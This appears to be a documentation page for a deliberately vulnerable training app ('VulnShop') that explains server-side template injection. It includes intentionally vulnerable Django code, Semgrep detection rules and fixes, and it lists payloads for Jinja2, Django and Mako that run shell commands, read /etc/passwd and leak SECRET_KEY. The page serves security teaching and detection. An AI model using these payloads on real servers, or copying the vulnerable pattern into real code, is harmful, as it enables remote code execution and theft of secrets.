---
title: Server-Side Template Injection (SSTI)
description: Understanding and detecting SSTI vulnerabilities
---

# Server-Side Template Injection (SSTI)

**Server-Side Template Injection** occurs when user input is embedded in templates and executed on the server. This can lead to remote code execution by exploiting template engine features.

## Overview

| Attribute | Value |
|-----------|-------|
| **CWE** | [CWE-1336: Template Injection](https://cwe.mitre.org/data/definitions/1336.html) |
| **OWASP** | A03:2021 - Injection |
| **Severity** | Critical (CVSS 9.8) |
| **Impact** | Remote Code Execution |

## How It Works

```python
# VULNERABLE: User input in template string
def render_greeting(request):
    name = request.GET['name']
    template = Template(f"Hello, {name}!")
    return HttpResponse(template.render(Context()))
```

**Attack:**
```
GET /greet?name={{7*7}}
Response: Hello, 49!

GET /greet?name={{config.items()}}
Response: Hello, [('SECRET_KEY', 'abc123'), ...]
```

## VulnShop Implementation

**File:** `notifications/views.py:25-40`

```python
from django.template import Template, Context

def preview_notification(request):
    template_str = request.POST.get('template')
    variables = {'username': request.user.username}

    # VULNERABLE: User-controlled template
    template = Template(template_str)
    rendered = template.render(Context(variables))

    return HttpResponse(rendered)
```

**Jinja2 Exploit (if used):**
```python
{{ ''.__class__.__mro__[1].__subclasses__()[408]('id', shell=True, stdout=-1).communicate() }}
```

**Django Template Exploit:**
```django
{% debug %}
{{ settings.SECRET_KEY }}
```

## Detection

### Semgrep

```yaml
rules:
  - id: ssti-django-template
    patterns:
      - pattern: Template($USER_INPUT)
      - pattern-not: Template("...")
    message: SSTI via user-controlled template
    severity: ERROR
    languages: [python]

  - id: ssti-jinja2
    pattern: jinja2.Template($USER_INPUT).render(...)
    message: SSTI via Jinja2 template
    severity: ERROR
    languages: [python]
```

## Remediation

### 1. Never Use User Input as Template

```python
def preview_notification(request):
    template_id = request.POST.get('template_id')

    # SAFE: Use predefined templates
    TEMPLATES = {
        'welcome': 'templates/notifications/welcome.html',
        'order': 'templates/notifications/order.html',
    }

    if template_id not in TEMPLATES:
        return HttpResponse("Invalid template", status=400)

    return render(request, TEMPLATES[template_id], {'user': request.user})
```

### 2. Sandboxed Templates (Jinja2)

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_template)
result = template.render(safe_context)
```

### 3. Use Simple String Formatting

```python
def preview_notification(request):
    message = request.POST.get('message')
    username = request.user.username

    # SAFE: Simple string formatting (no template execution)
    output = f"Dear {username}, {message}"
    return HttpResponse(output)
```

## Template Engine Payloads

### Jinja2

```python
# Read file
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# Code execution
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### Django

```django
{% load log %}{% get_admin_log 10 as log %}{{ log }}
{{ settings.SECRET_KEY }}
```

### Mako

```python
${self.module.cache.util.os.popen('id').read()}
```

## References

- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
